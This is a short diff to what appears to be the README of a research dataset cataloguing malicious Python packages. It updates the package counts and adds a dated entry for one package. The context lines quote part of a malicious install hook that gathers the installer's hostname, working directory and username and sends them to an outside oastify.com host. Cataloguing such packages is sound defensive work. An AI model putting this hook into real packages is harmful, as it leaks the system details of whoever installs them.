@@ -1,6 +1,6 @@
 ## Dataset Size
 
-This data set includes about 7,118 versions of the source code of 6,047 malicious packages.
+This data set includes about 7,119 versions of the source code of 6,048 malicious packages.
 
 ## Dataset Format
 
@@ -682,6 +682,9 @@ class CustomInstall(install):
         ploads = {'hostname': hostname, 'cwd': cwd, 'username': username}
         requests.get("https://1y05ug5pi97xa0bk2bjhdwp5yw4nsdg2.oastify.com", params=ploads)  # Replace with Interactsh or Pipedream
 ```
+
+### 09 Jul. 2024
+pystlete [2.9] <br>
 
 ## About the malicious packages detection
 
